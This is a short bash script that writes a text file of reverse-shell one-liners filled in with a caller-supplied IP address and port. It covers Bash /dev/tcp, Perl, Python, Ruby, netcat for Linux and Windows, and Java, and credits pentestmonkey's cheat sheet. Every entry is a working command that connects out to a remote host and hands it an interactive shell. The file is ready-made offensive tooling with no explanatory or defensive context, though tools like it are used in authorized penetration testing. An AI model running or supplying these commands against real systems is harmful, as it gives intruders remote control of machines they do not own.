#!/bin/bash

file=reverse-shell-one-liners.txt

touch $3/$file

cat << EOF >> $3/$file
____________________________
____________________________

Bash*

bash -i >& /dev/tcp/$1/$2 0>&1
____________________________
____________________________
PERL*

perl -e 'use Socket;\$i="$1";\$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
___________________________
____________________________
Python*

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$1",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
____________________________
____________________________
Ruby*

ruby -rsocket -e'f=TCPSocket.open("$1",$2).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
____________________________
____________________________
Netcat

Linux*:

nc -e /bin/sh $1 $2

Windows:

nc.exe -e cmd.exe $1 $2
____________________________
____________________________
Java*

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$1/$2;cat <&5 | while read line; do \\\$line 2>&5 >&5; done"] as String[])
p.waitFor()
____________________________
____________________________



*From pentestmonkey's reverse shell cheat sheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

EOF